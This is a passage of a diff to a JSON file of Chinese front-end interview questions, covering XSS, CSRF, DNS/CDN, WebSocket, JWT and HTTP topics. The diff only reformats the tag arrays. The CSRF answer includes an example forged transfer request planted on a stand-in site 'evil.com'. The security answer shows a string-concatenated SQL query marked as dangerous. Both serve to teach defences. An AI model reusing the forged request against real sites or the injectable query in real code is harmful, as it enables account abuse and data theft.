session=xxx; HttpOnly; Secure; SameSite=Strict\n# HttpOnly: JS 无法读取 Cookie，即使 XSS 也无法窃取\n```\n\n**4. 富文本使用白名单过滤**\n```js\n// 使用 DOMPurify 库\nimport DOMPurify from 'dompurify';\nel.innerHTML = DOMPurify.sanitize(userInput);\n```",
-    "tags": [
-      "XSS",
-      "安全",
-      "CSP"
-    ],
+    "tags": ["XSS", "安全", "CSP"],
     "source": "高频"
   },
   {
@@ -619,11 +401,7 @@
     "difficulty": 2,
     "question": "什么是 CSRF 攻击？如何防御？",
     "answer": "## CSRF（跨站请求伪造）\n\n### 攻击原理\n```\n1. 用户登录 bank.com，浏览器保存 Cookie\n2. 用户访问恶意网站 evil.com\n3. evil.com 页面包含：\n   <img src=\"https://bank.com/transfer?to=hacker&amount=10000\">\n   或 <form action=\"https://bank.com/transfer\" method=\"POST\">\n4. 浏览器自动带上 bank.com 的 Cookie 发送请求\n5. 服务器以为是合法用户操作\n```\n\n### 防御措施\n\n**1. SameSite Cookie（最有效的现代方案）**\n```http\nSet-Cookie: session=xxx; SameSite=Strict  # 完全禁止第三方携带\nSet-Cookie: session=xxx; SameSite=Lax     # 允许导航（GET），禁止表单 POST\nSet-Cookie: session=xxx; SameSite=None; Secure  # 允许第三方（需 HTTPS）\n```\n\n**2. CSRF Token**\n```\n1. 服务器生成随机 token，存在 Session 中，同时发给页面\n2. 前端每个请求携带该 token（Header 或表单字段）\n3. 服务器验证 token 匹配\n```\n```js\n// 前端发请求时附带\naxios.defaults.headers.common['X-CSRF-Token'] = getCsrfToken();\n```\n\n**3. 验证 Referer / Origin**\n```js\n// 服务器检查请求来源\nconst origin = req.headers.origin || req.headers.referer;\nif (!origin?.startsWith('https://bank.com')) {\n  return res.status(403).json({ error: 'CSRF detected' });\n}\n```\n\n**4. 双重 Cookie 验证**\n```\nCookie 中存 CSRF token，请求时也在参数/Header 中带上，\n服务器对比两者是否一致（第三方网站无法读取 Cookie）\n```\n\n### CSRF vs XSS\n```\nXSS：在目标网站注入并执行恶意脚本\nCSRF：借用用户身份向目标网站发送伪造请求（不需要脚本执行权限）\n```",
-    "tags": [
-      "CSRF",
-      "安全",
-      "Cookie"
-    ],
+    "tags": ["CSRF", "安全", "Cookie"],
     "source": "高频"
   },
   {
@@ -632,11 +410,7 @@
     "difficulty": 1,
     "question": "DNS 解析过程是什么？CDN 的工作原理是什么？",
     "answer": "## DNS 解析过程\n\n### 完整流程\n```\n1. 浏览器缓存（chrome://net-internals/#dns）\n2. 操作系统缓存（/etc/hosts 文件优先）\n3. 本地 DNS 服务器（ISP 提供，通常是 114.114.114.114）\n4. 根域名服务器（.）→ 返回顶级域服务器地址\n5. 顶级域名服务器（.com）→ 返回权威 DNS 地址\n6. 权威 DNS 服务器 → 返回最终 IP\n7. 结果缓存（TTL 时间内有效）\n```\n\n### DNS 记录类型\n```\nA      域名 → IPv4 地址\nAAAA   域名 → IPv6 地址\nCNAME  域名 → 另一个域名（别名）\nMX     邮件服务器\nTXT    文本信息（域名验证、SPF等）\nNS     权威 DNS 服务器\n```\n\n### CDN 工作原理\n```\n没有 CDN：\n  用户 → 源站服务器（可能跨越半个地球）\n\n有 CDN：\n  1. 域名解析走 CDN 的 NS（CNAME 到 CDN 域名）\n  2. CDN 的智能 DNS 根据用户 IP 返回最近节点的 IP\n  3. 用户连接最近的 CDN 边缘节点\n  4. 命中缓存 → 直接返回\n  5. 未命中 → 回源拉取，缓存后返回\n```\n\n### CDN 的收益\n```\n- 降低延迟（就近访问）\n- 减轻源站压力\n- 抵御 DDoS（流量分散到边缘节点）\n- 静态资源加速（JS/CSS/图片/视频）\n```\n\n### DNS 预解析优化\n```html\n<link rel=\"dns-prefetch\" href=\"//cdn.example.com\">\n<link rel=\"preconnect\" href=\"https://cdn.example.com\">\n```",
-    "tags": [
-      "DNS",
-      "CDN",
-      "域名解析"
-    ],
+    "tags": ["DNS", "CDN", "域名解析"],
     "source": "高频"
   },
   {
@@ -645,12 +419,7 @@
     "difficulty": 2,
     "question": "WebSocket、SSE、长轮询的区别是什么？各自适用什么场景？",
     "answer": "## 实时通信方案对比\n\n### 短轮询（Short Polling）\n```js\n// 每隔固定时间请求一次\nsetInterval(async () => {\n  const data = await fetch('/api/messages');\n  render(data);\n}, 3000);\n// 缺点：大量无效请求，延迟高\n```\n\n### 长轮询（Long Polling）\n```js\nasync function longPoll() {\n  const data = await fetch('/api/wait');  // 服务器 hold 住请求，有数据才响应\n  render(data);\n  longPoll();  // 立即发下一个请求\n}\n// 优点：比短轮询实时，兼容性好\n// 缺点：服务器资源占用，响应延迟\n```\n\n### SSE（Server-Sent Events）\n```js\n// 服务器 → 客户端 单向推送\nconst es = new EventSource('/api/stream');\nes.onmessage = (e) => render(e.data);\nes.addEventListener('custom-event', (e) => console.log(e.data));\nes.onerror = () => es.close();\n\n// 服务端（Node.js）\nres.setHeader('Content-Type', 'text/event-stream');\nres.setHeader('Cache-Control', 'no-cache');\nres.write(`data: ${JSON.stringify(msg)}\\n\\n`);\n// 自动重连（reconnect）\n```\n\n### WebSocket\n```js\n// 双向全双工通信\nconst ws = new WebSocket('wss://example.com/ws');\nws.onopen = () => ws.send(JSON.stringify({ type: 'hello' }));\nws.onmessage = (e) => render(JSON.parse(e.data));\nws.onerror = (e) => console.error(e);\nws.onclose = () => reconnect();\n\n// 心跳保活\nsetInterval(() => {\n  if (ws.readyState === WebSocket.OPEN) ws.send('ping');\n}, 30000);\n```\n\n### 对比\n```\n方式         方向         协议         适用场景\n短轮询       客→服        HTTP         简单低频场景\n长轮询       客→服        HTTP         兼容性要求高\nSSE          服→客        HTTP/2       通知、日志流、AI 流式输出\nWebSocket    双向         WS           聊天、游戏、协同编辑\n```",
-    "tags": [
-      "WebSocket",
-      "SSE",
-      "长轮询",
-      "实时通信"
-    ],
+    "tags": ["WebSocket", "SSE", "长轮询", "实时通信"],
     "source": "高频"
   },
   {
@@ -659,13 +428,7 @@
     "difficulty": 2,
     "question": "Cookie、Session、Token、JWT 的区别和使用场景？",
     "answer": "## 身份认证方案对比\n\n### Cookie + Session（传统方案）\n```\n1. 用户登录 → 服务器创建 Session（存在内存/Redis）\n2. 服务器返回 Set-Cookie: sessionId=xxx\n3. 后续请求浏览器自动带 Cookie\n4. 服务器用 sessionId 查 Session 验证身份\n```\n```\n优点：服务端可主动撤销（退出登录立即生效）\n缺点：服务端有状态，分布式系统需共享 Session（Redis）\n```\n\n### JWT（JSON Web Token）\n```\n结构：Header.Payload.Signature\nHeader:  {\"alg\":\"HS256\",\"typ\":\"JWT\"}\nPayload: {\"sub\":\"1234\",\"name\":\"Alice\",\"exp\":1700000000}\nSignature: HMAC-SHA256(base64(Header)+\".\"+base64(Payload), secret)\n```\n\n```js\n// 客户端存储在 localStorage 或内存中\n// 请求时手动添加\nheaders: { Authorization: `Bearer ${token}` }\n```\n\n```\n优点：无状态，服务端无需存储，天然支持分布式\n缺点：\n- 无法主动撤销（只能等过期）→ 用短期 token + refresh token\n- Payload 可被解码（不要存敏感信息）\n- token 泄露风险（存 localStorage 可被 XSS 读取）\n```\n\n### Token vs JWT\n```\nToken：通常是随机字符串，服务端需查库验证\nJWT：自包含，服务端无需查库（用签名验证）\n```\n\n### 安全建议\n```js\n// JWT 存储建议：HttpOnly Cookie（防 XSS）+ SameSite（防 CSRF）\nSet-Cookie: token=xxx; HttpOnly; Secure; SameSite=Strict\n\n// 短期 access token（15分钟）+ 长期 refresh token（7天）\n// access token 过期后用 refresh token 换新的\n```",
-    "tags": [
-      "HTTP",
-      "Cookie",
-      "Session",
-      "Token",
-      "JWT"
-    ],
+    "tags": ["HTTP", "Cookie", "Session", "Token", "JWT"],
     "source": "高频"
   },
   {
@@ -674,11 +437,7 @@
     "difficulty": 3,
     "question": "TCP 和 UDP 的区别是什么？什么场景下使用 UDP？",
     "answer": "## TCP vs UDP\n\n### 核心区别\n```\n特性          TCP                    UDP\n连接          有连接（三次握手）       无连接\n可靠性        可靠（重传、确认）       不可靠（可能丢包）\n顺序          有序                    无序\n流量控制      有（滑动窗口）          无\n拥塞控制      有                      无\n速度          慢（开销大）            快\n头部大小      20-60 字节              8 字节\n广播          不支持                  支持\n```\n\n### TCP 适用场景\n```\n- HTTP/HTTPS（文件传输、网页）\n- 文件下载（FTP）\n- 邮件（SMTP/IMAP）\n- SSH 远程连接\n- 数据库连接\n一切对数据完整性要求高的场景\n```\n\n### UDP 适用场景\n```\n- 视频通话（WebRTC）：可以丢帧，不能有延迟\n- 在线游戏：低延迟优先，少量丢包可接受\n- DNS 查询：小数据包，一问一答，UDP 更快\n- 直播推流：实时性优先\n- HTTP/3 (QUIC)：在 UDP 上自己实现可靠传输\n\n共同点：实时性 > 可靠性\n```\n\n### QUIC 为什么选择 UDP\n```\n1. UDP 无内核层面的队头阻塞\n2. 可以在用户态自由实现拥塞控制算法\n3. 0-RTT 连接恢复\n4. 避免 TCP 的僵化（内核协议栈难以修改）\n```",
-    "tags": [
-      "TCP",
-      "UDP",
-      "对比"
-    ],
+    "tags": ["TCP", "UDP", "对比"],
     "source": "高频"
   },
   {
@@ -687,11 +446,7 @@
     "difficulty": 2,
     "question": "从输入 URL 到页面显示，发生了什么？",
     "answer": "## URL 到页面的完整过程\n\n### 1. URL 解析\n```\n解析协议、域名、路径、参数\n检查 HSTS 预加载列表（是否强制 HTTPS）\n```\n\n### 2. DNS 解析\n```\n浏览器缓存 → OS 缓存 → hosts 文件 → 本地 DNS → 递归查询\n得到 IP 地址\n```\n\n### 3. TCP 连接 + TLS 握手\n```\nTCP 三次握手建立连接\nHTTPS：TLS 握手（1-RTT 或 0-RTT）\nHTTP/3：QUIC 握手（0/1-RTT）\n```\n\n### 4. HTTP 请求\n```\n发送请求（方法、路径、Headers、Body）\n服务器处理并返回响应\n```\n\n### 5. 浏览器解析与渲染\n```\n5.1 解析 HTML → DOM Tree\n5.2 解析 CSS → CSSOM Tree\n    （CSS 是渲染阻塞资源，不阻塞 HTML 解析）\n5.3 JS 执行\n    - <script>：阻塞 HTML 解析（除非 async/defer）\n    - async：下载完立即执行\n    - defer：HTML 解析完才执行，保持顺序\n5.4 DOM + CSSOM → Render Tree（只含可见节点）\n5.5 Layout（重排）：计算位置和尺寸\n5.6 Paint（重绘）：绘制像素\n5.7 Composite（合成）：GPU 合并图层\n```\n\n### 6. 关键优化点\n```\nDNS 预解析：<link rel=\"dns-prefetch\">\n预连接：<link rel=\"preconnect\">\n关键 CSS 内联，非关键 CSS 异步加载\nJS 使用 defer/async\n图片懒加载：loading=\"lazy\"\nHTTP/2 多路复用减少连接数\nCDN 加速静态资源\n```",
-    "tags": [
-      "浏览器",
-      "渲染",
-      "从输入URL到页面"
-    ],
+    "tags": ["浏览器", "渲染", "从输入URL到页面"],
     "source": "高频"
   },
   {
@@ -700,11 +455,7 @@
     "difficulty": 2,
     "question": "HTTP 请求方法有哪些？GET 和 POST 的区别是什么？",
     "answer": "## HTTP 请求方法\n\n### 常见方法\n```\nGET     获取资源（幂等、安全）\nPOST    创建资源（非幂等）\nPUT     全量更新资源（幂等）\nPATCH   部分更新资源\nDELETE  删除资源（幂等）\nHEAD    只获取响应头（不返回 body）\nOPTIONS 查询服务器支持的方法（CORS 预检）\n```\n\n### GET vs POST 区别\n```\n特性          GET                     POST\n数据位置      URL 查询字符串           请求体（Body）\n数据大小      受 URL 长度限制（~2KB）  几乎无限制\n安全性        数据暴露在 URL 中        相对安全\n缓存          可以被缓存               默认不缓存\n幂等性        幂等（多次结果相同）     非幂等\n收藏          可以加入收藏夹           不能\n历史记录      URL 保存在浏览器历史中  Body 不保存\n```\n\n### 幂等性\n```\n幂等：多次执行结果相同\nGET、PUT、DELETE、HEAD 是幂等的\nPOST、PATCH 不是幂等的\n\n实践意义：\n- 幂等方法可以安全重试\n- 非幂等方法重试需要防重（如订单去重）\n```\n\n### RESTful 设计规范\n```\nGET    /articles          获取文章列表\nGET    /articles/1        获取 id=1 的文章\nPOST   /articles          创建文章\nPUT    /articles/1        全量更新 id=1 的文章\nPATCH  /articles/1        部分更新\nDELETE /articles/1        删除\n\n状态码语义：\n201 Created → POST 成功\n204 No Content → DELETE 成功\n```",
-    "tags": [
-      "HTTP",
-      "请求方法",
-      "RESTful"
-    ],
+    "tags": ["HTTP", "请求方法", "RESTful"],
     "source": "高频"
   },
   {
@@ -713,12 +464,7 @@
     "difficulty": 3,
     "question": "前端常见安全攻击还有哪些？CSP、HSTS、点击劫持如何防御？",
     "answer": "## 前端安全防御体系\n\n### 点击劫持（Clickjacking）\n```\n攻击：将目标网站用透明 iframe 覆盖在诱导页面上，用户点击其实是在操作目标网站\n\n防御：\n```\n```http\n# 禁止被 iframe 嵌入\nX-Frame-Options: DENY          # 完全禁止\nX-Frame-Options: SAMEORIGIN   # 只允许同源嵌入\n\n# 现代方案（CSP）\nContent-Security-Policy: frame-ancestors 'none'\nContent-Security-Policy: frame-ancestors 'self' https://trusted.com\n```\n\n### HSTS（强制 HTTPS）\n```http\nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload\n# 告诉浏览器该域名始终使用 HTTPS，即使输入 http:// 也自动转\n# preload 可提交到 Chrome 的 HSTS 预加载列表（全球生效）\n```\n\n### CSP（内容安全策略）\n```http\n# 基础安全策略\nContent-Security-Policy:\n  default-src 'self';           # 默认只允许同源\n  script-src 'self' 'nonce-abc'; # 脚本需要 nonce 或 hash\n  style-src 'self' https://fonts.googleapis.com;\n  img-src 'self' data: https:;\n  connect-src 'self' https://api.example.com;\n  frame-ancestors 'none';\n  base-uri 'self';\n  form-action 'self';\n\n# 上线前先用 report-only 模式收集违规\nContent-Security-Policy-Report-Only: ...; report-uri /csp-report\n```\n\n### 其他安全响应头\n```http\nX-Content-Type-Options: nosniff          # 禁止 MIME 嗅探\nX-XSS-Protection: 1; mode=block         # 老浏览器 XSS 过滤（已废弃）\nReferrer-Policy: strict-origin-when-cross-origin  # 控制 Referer\nPermissions-Policy: camera=(), microphone=()       # 禁用敏感 API\n```\n\n### SQL 注入（虽然主要是后端）\n```js\n// 危险：拼接 SQL\ndb.query(`SELECT * FROM users WHERE name = '${userInput}'`);\n\n// 安全：参数化查询\ndb.query('SELECT * FROM users WHERE name = ?', [userInput]);\n```",
-    "tags": [
-      "网络安全",
-      "CSP",
-      "HSTS",
-      "点击劫持"
-    ],
+    "tags": ["网络安全", "CSP", "HSTS", "点击劫持"],
     "source": "高频"
   },
   {
@@ -727,12 +473,7 @@
     "difficulty": 2,
     "question": "HTTP 长连接（keep-alive）是什么？HTTP/1.1 和 HTTP/2 连接复用有什么不同？",
     "answer": "## HTTP 连接管理\n\n### HTTP/1.0 短连接\n```\n每次请求新建 TCP 连接，响应后立即关闭。\n开销极大（每次三次握手 + TLS 握手）\n```\n\n### HTTP/1.1 长连接（Keep-Alive）\n```http\n# 默认开启（HTTP/1.1 中 Connection: keep-alive 是默认值）\nConnection: keep-alive\nKeep-Alive: timeout=60, max=100   # 60秒超时，最多100个请求\n\n# 响应\nConnection: keep-alive\n```\n\n```\n同一 TCP 连接上串行复用多个请求\n但仍有队头阻塞：前一个响应未完成，后续请求等待\n\n浏览器限制：同域最多 6 个并行 TCP 连接\n→ 出现 Domain Sharding（域名分片）优化技巧（HTTP/2 后废弃）\n```\n\n### HTTP/2 多路复用\n```\n单个 TCP 连接上并行处理多个请求/响应\n帧（Frame）：数据最小传输单位\n流（Stream）：虚拟通道，每个请求/响应是一个流\n```\n\n```\nHTTP/1.1：请求串行，需要多个连接\n  conn1: req1 → res1 → req2 → res2\n  conn2: req3 → res3\n  conn3: req4 → res4\n\nHTTP/2：单连接并行\n  stream1: req1 ≈≈≈≈≈≈≈≈≈≈≈ res1\n  stream2:    req2 ≈≈≈≈ res2\n  stream3:      req3 ≈≈≈≈≈≈≈≈ res3\n```\n\n### 连接池（前端不常见，但 Node.js 中有）\n```js\n// Node.js http.Agent 连接池\nconst http = require('http');\nconst agent = new http.Agent({\n  keepAlive: true,\n  maxSockets: 10,      // 最大并发连接数\n  keepAliveMsecs: 3000 // 保活时间\n});\n\nfetch('http://api.example.com', { agent });\n```",
-    "tags": [
-      "HTTP",
-      "连接",
-      "keep-alive",
-      "连接池"
-    ],
+    "tags": ["HTTP", "连接", "keep-alive", "连接池"],
     "source": "高频"
   },
   {
@@ -741,11 +482,7 @@
     "difficulty": 2,
     "question": "Service Worker 是什么？如何用它实现离线缓存？",
     "answer": "## Service Worker\n\n### 概念\nService Worker 是运行在浏览器后台的独立线程（Worker），可以拦截网络请求，实现离线缓存、后台同步、推送通知等功能。\n\n```\n特点：\n- 独立于页面线程（不阻塞主线程）\n- 只能在 HTTPS 或 localhost 下运行\n- 生命周期独立（页面关闭后仍可运行）\n- 不能直接操作 DOM\n```\n\n### 注册与安装\n```js\n// main.js（页面中）\nif ('serviceWorker' in navigator) {\n  navigator.serviceWorker.register('/sw.js')\n    .then(reg => console.log('SW registered:', reg.scope))\n    .catch(err => console.error('SW error:', err));\n}\n```\n\n### Service Worker 生命周期\n```\ninstall（安装）→ activate（激活）→ fetch（拦截请求）\n```\n\n### 离线缓存示例（sw.js）\n```js\nconst CACHE_NAME = 'app-v1';\nconst STATIC_ASSETS = ['/', '/index.html', '/app.js', '/app.css'];\n\n// 安装：预缓存静态资源\nself.addEventListener('install', (e) => {\n  e.waitUntil(\n    caches.open(CACHE_NAME).then(cache => cache.addAll(STATIC_ASSETS))\n  );\n  self.skipWaiting(); // 立即激活\n});\n\n// 激活：清理旧缓存\nself.addEventListener('activate', (e) => {\n  e.waitUntil(\n    caches.keys().then(keys =>\n      Promise.all(keys.filter(k => k !== CACHE_NAME).map(k => caches.delete(k)))\n    )\n  );\n  self.clients.claim();\n});\n\n// 拦截请求（Cache First 策略）\nself.addEventListener('fetch', (e) => {\n  e.respondWith(\n    caches.match(e.request).then(cached => {\n      if (cached) return cached;\n      return fetch(e.request).then(res => {\n        const clone = res.clone();\n        caches.open(CACHE_NAME).then(cache => cache.put(e.request, clone));\n        return res;\n      });\n    })\n  );\n});\n```\n\n### 缓存策略\n```\nCache First：先缓存，适合静态资源（CSS/JS/图片）\nNetwork First：先网络，适合 API 数据（要求最新）\nStale While Revalidate：返回缓存同时后台更新，适合非关键资源\n```",
-    "tags": [
-      "浏览器缓存",
-      "Service Worker",
-      "PWA"
-    ],
+    "tags": ["浏览器缓存", "Service Worker", "PWA"],
     "source": "高频"
   },
   {
@@ -754,12 +491,7 @@
     "difficulty": 3,
     "question": "preload、prefetch、preconnect 的区别是什么？如何合理使用？",
     "answer": "## 资源预加载优化\n\n### preload（立即需要）\n```html\n<!-- 当前页面一定会用到，优先加载 -->\n<link rel=\"preload\" href=\"/fonts/font.woff2\" as=\"font\" crossorigin>\n<link rel=\"preload\" href=\"/critical.js\" as=\"script\">\n<link rel=\"preload\" href=\"/hero.jpg\" as=\"image\">\n<link rel=\"preload\" href=\"/critical.css\" as=\"style\">\n```\n```\n- 高优先级，立即下载\n- as 属性指定资源类型（影响优先级和 CSP）\n- 字体必须加 crossorigin（即使同源）\n- 不会自动执行，只下载\n- 警告：如果页面未使用 preload 的资源，浏览器会警告\n```\n\n### prefetch（未来需要）\n```html\n<!-- 未来页面/路由可能用到，空闲时加载 -->\n<link rel=\"prefetch\" href=\"/next-page.js\" as=\"script\">\n<link rel=\"prefetch\" href=\"/next-page.css\" as=\"style\">\n```\n```\n- 低优先级，浏览器空闲时加载\n- 跨页面有效（缓存在 disk cache）\n- React Router / Next.js 路由预取就是基于此\n```\n\n### preconnect（提前建立连接）\n```html\n<!-- 提前与第三方域名建立 TCP+TLS 连接 -->\n<link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">\n<link rel=\"preconnect\" href=\"https://cdn.example.com\" crossorigin>\n```\n```\n- 只建立连接，不下载资源\n- 适合：字体、CDN、API 域名\n- 连接闲置会关闭，建议与 preload 配合\n```\n\n### dns-prefetch（只做 DNS 解析）\n```html\n<!-- 比 preconnect 开销更小，用于不确定的第三方域名 -->\n<link rel=\"dns-prefetch\" href=\"//analytics.example.com\">\n```\n\n### 使用建议\n```\n字体（woff2）：   preload + preconnect（Google Fonts 域名）\n关键 CSS/JS：     preload\n首屏大图：        preload as=\"image\"\n下一页路由：      prefetch\nAPI 域名：        preconnect 或 dns-prefetch\n不确定的域名：    dns-prefetch（比 preconnect 便宜）\n```\n\n### 动态 prefetch（基于用户行为）\n```js\n// 用户 hover 链接时预取\nlink.addEventListener('mouseenter', () => {\n  const hint = document.createElement('link');\n  hint.rel = 'prefetch';\n  hint.href = link.href;\n  document.head.appendChild(hint);\n});\n```",
-    "tags": [
-      "网络性能",
-      "优化",
-      "preload",
-      "prefetch"
-    ],
+    "tags": ["网络性能", "优化", "preload", "prefetch"],
     "source": "高频"
   },
   {
@@ -768,12 +500,7 @@
     "difficulty": 3,
     "question": "HTTP 如何实现大文件传输和断点续传？",
     "answer": "## 大文件传输与断点续传\n\n### Range 请求\n```http\n# 客户端请求部分内容\nGET /file.zip HTTP/1.1\nRange: bytes=0-1023        # 第 0~1023 字节（第一个 1KB）\nRange: bytes=1024-2047     # 第二个 1KB\nRange: bytes=-1024         # 最后 1KB\nRange: bytes=1024-         # 从第 1024 字节到结尾\n\n# 服务器响应（206 Partial Content）\nHTTP/1.1 206 Partial Content\nContent-Range: bytes 0-1023/104857600  # 当前范围/总大小\nContent-Length: 1024\nAccept-Ranges: bytes  # 表明服务器支持断点续传\n```\n\n### 断点续传实现\n```js\nasync function downloadWithResume(url, filename) {\n  let downloaded = 0;\n  const chunks = [];\n\n  // 先获取文件总大小\n  const headRes = await fetch(url, { method: 'HEAD' });\n  const total = Number(headRes.headers.get('content-length'));\n\n  const CHUNK = 1024 * 1024; // 1MB 每块\n\n  while (downloaded < total) {\n    const end = Math.min(downloaded + CHUNK - 1, total - 1);\n    const res = await fetch(url, {\n      headers: { Range: `bytes=${downloaded}-${end}` }\n    });\n    const chunk = await res.arrayBuffer();\n    chunks.push(chunk);\n    downloaded += chunk.byteLength;\n    console.log(`${((downloaded / total) * 100).toFixed(1)}%`);\n  }\n\n  const blob = new Blob(chunks);\n  const a = document.createElement('a');\n  a.href = URL.createObjectURL(blob);\n  a.download = filename;\n  a.click();\n}\n```\n\n### 分片上传（大文件上传）\n```js\nasync function uploadInChunks(file, chunkSize = 5 * 1024 * 1024) {\n  const total = Math.ceil(file.size / chunkSize);\n\n  for (let i = 0; i < total; i++) {\n    const chunk = file.slice(i * chunkSize, (i + 1) * chunkSize);\n    const form = new FormData();\n    form.append('file', chunk);\n    form.append('index', i);\n    form.append('total', total);\n    form.append('filename', file.name);\n\n    await fetch('/upload/chunk', { method: 'POST', body: form });\n  }\n\n  // 通知服务端合并\n  await fetch('/upload/merge', {\n    method: 'POST',\n    body: JSON.stringify({ filename: file.name, total }),\n    headers: { 'Content-Type': 'application/json' }\n  });\n}\n```",
-    "tags": [
-      "HTTP",
-      "Range",
-      "断点续传",
-      "大文件"
-    ],
+    "tags": ["HTTP", "Range", "断点续传", "大文件"],
     "source": "高频"
   },
   {
@@ -782,11 +509,7 @@
     "difficulty": 2,
     "question": "除了 CORS，还有哪些跨域解决方案？",
     "answer": "## 跨域解决方案\n\n### 1. Nginx 反向代理（生产环境推荐）\n```nginx\nserver {\n  listen 80;\n  server_name frontend.com;\n\n  location /api/ {\n    proxy_pass http://backend.com/api/;\n    proxy_set_header Host $host;\n    proxy_set_header X-Real-IP $remote_addr;\n    # 同源请求，无跨域问题\n  }\n}\n```\n\n### 2. 开发环境代理（Vite/Webpack）\n```js\n// vite.config.ts\nexport default {\n  server: {\n    proxy: {\n      '/api': {\n        target: 'http://localhost:3000',\n        changeOrigin: true,\n        rewrite: path => path.replace(/^\\/api/, '')\n      }\n    }\n  }\n}\n```\n\n### 3. JSONP（仅 GET，已过时）\n```js\nfunction jsonp(url, callback) {\n  const name = `cb_${Date.now()}`;\n  window[name] = (data) => {\n    callback(data);\n    delete window[name];\n    document.body.removeChild(script);\n  };\n  const script = document.createElement('script');\n  script.src = `${url}?callback=${name}`;\n  document.body.appendChild(script);\n}\n\njsonp('https://api.example.com/data', (data) => console.log(data));\n// 服务端返回：cb_1234567890({\"result\":\"...\"})\n```\n\n### 4. postMessage（iframe 跨域通信）\n```js\n// 父页面发送\nconst iframe = document.querySelector('iframe');\niframe.contentWindow.postMessage({ type: 'hello', data: '...' }, 'https://child.com');\n\n// iframe 接收\nwindow.addEventListener('message', (e) => {\n  if (e.origin !== 'https://parent.com') return; // 安全验证\n  console.log(e.data);\n  e.source.postMessage({ type: 'reply' }, e.origin);\n});\n```\n\n### 5. WebSocket（不受同源限制）\n```js\nconst ws = new WebSocket('wss://api.example.com/ws');\n// WebSocket 握手通过 HTTP Upgrade，但之后不受同源策略限制\n```\n\n### 各方案对比\n```\nCORS：   标准方案，服务端配置，推荐\nNginx：  统一代理，生产环境常用\nDev代理：开发环境便捷配置\nJSONP：  只支持 GET，有安全风险，已过时\npostMessage：iframe 跨窗口通信专用\n```",
-    "tags": [
-      "跨域",
-      "JSONP",
-      "代理"
-    ],
+    "tags": ["跨域", "JSONP", "代理"],
     "source": "高频"
   },
   {
@@ -795,11 +518,7 @@
     "difficulty": 3,
     "question": "什么是 HTTP 队头阻塞（Head-of-Line Blocking）？HTTP/2 和 HTTP/3 分别如何解决？",
     "answer": "## HTTP 队头阻塞\n\n### 什么是队头阻塞\n```\n队头阻塞：队列中第一个任务阻塞了后续所有任务\n\nHTTP/1.1 层面：\n同一 TCP 连接中，请求必须按顺序串行处理。\nreq1 响应慢 → req2、req3... 全部等待\n\nTCP 层面：\nTCP 保证数据有序，一个数据包丢失 → 后续包必须等待重传\n（即使数据在不同逻辑流中）\n```\n\n### HTTP/2 的解决（部分解决）\n```\n引入多路复用（Multiplexing）：\n- 单连接上多个流（Stream）并行\n- 解决了 HTTP 层的队头阻塞\n\n但 TCP 层队头阻塞依然存在：\n- HTTP/2 的所有流共享一个 TCP 连接\n- 一旦 TCP 丢包，所有流都要等待重传\n- 网络质量差时 HTTP/2 可能比 HTTP/1.1 更慢！\n  （HTTP/1.1 多个 TCP 连接，一个丢包不影响其他）\n```\n\n### HTTP/3 的解决（彻底解决）\n```\n基于 QUIC（UDP）：\n- 每个流（Stream）独立，流之间无依赖\n- 一个流丢包只影响该流，其他流正常进行\n- QUIC 在用户态实现可靠传输，可以精确控制\n\nQUIC 的其他优势：\n- 集成 TLS 1.3，握手更快（0/1-RTT）\n- 连接迁移（切换 WiFi/4G 不断连）\n- 改进的拥塞控制算法\n```\n\n### 实际性能对比\n```\n网络质量好（0% 丢包）：HTTP/2 ≈ HTTP/3 > HTTP/1.1\n网络质量差（2% 丢包）：HTTP/3 > HTTP/1.1 > HTTP/2\n移动端弱网环境：HTTP/3 优势明显\n```",
-    "tags": [
-      "HTTP",
-      "性能",
-      "连接优化"
-    ],
+    "tags": ["HTTP", "性能", "连接优化"],
     "source": "高频"
   },
   {
@@ -808,12 +527,7 @@
     "difficulty": 2,
     "question": "常见的 HTTP 请求头和响应头有哪些？分别有什么作用？",
     "answer": "## 常见 HTTP Headers\n\n### 通用头（请求和响应都有）\n```http\nCache-Control: no-cache, max-age=3600\nConnection: keep-alive\nContent-Type: application/json; charset=utf-8\nContent-Length: 1234\nDate: Mon, 01 Jan 2024 00:00:00 GMT\nTransfer-Encoding: chunked   # 分块传输（不知道总大小时）\n```\n\n### 请求头\n```http\nHost: api.example.com                   # 必须，目标主机\nAccept: application/json, text/html     # 期望响应类型\nAccept-Encoding: gzip, br, deflate      # 支持的压缩格式\nAccept-Language: zh-CN,zh;q=0.9        # 语言偏好\nUser-Agent: Mozilla/5.0 ...             # 浏览器标识\nReferer: https://example.com/page      # 来源页面\nOrigin: https://frontend.com           # CORS 来源（跨域时）\nAuthorization: Bearer <token>          # 认证 Token\nCookie: session=xxx; theme=dark        # Cookie\nIf-None-Match: \"abc123\"                # 协商缓存 ETag\nIf-Modified-Since: ...                 # 协商缓存时间\nRange: bytes=0-1023                    # 断点续传\nContent-Type: application/json        # 请求体类型\n```\n\n### 响应头\n```http\nContent-Type: application/json         # 响应体类型\nContent-Encoding: gzip                 # 响应体压缩方式\nETag: \"abc123\"                         # 协商缓存标识\nLast-Modified: ...                     # 资源修改时间\nSet-Cookie: session=xxx; HttpOnly      # 设置 Cookie\nLocation: https://new.example.com     # 重定向地址\nAccess-Control-Allow-Origin: *        # CORS 许可\nContent-Security-Policy: ...           # CSP 安全策略\nX-Frame-Options: DENY                  # 点击劫持防御\nStrict-Transport-Security: ...        # HSTS\nVary: Accept-Encoding                  # 缓存键变化（编码不同时不同缓存）\n```",
-    "tags": [
-      "HTTP",
-      "请求头",
-      "响应头",
-      "Header"
-    ],
+    "tags": ["HTTP", "请求头", "响应头", "Header"],
     "source": "高频"
   },
   {
@@ -822,11 +536,7 @@
     "difficulty": 3,
     "question": "前端网络性能优化有哪些综合手段？如何系统性地优化首屏加载？",
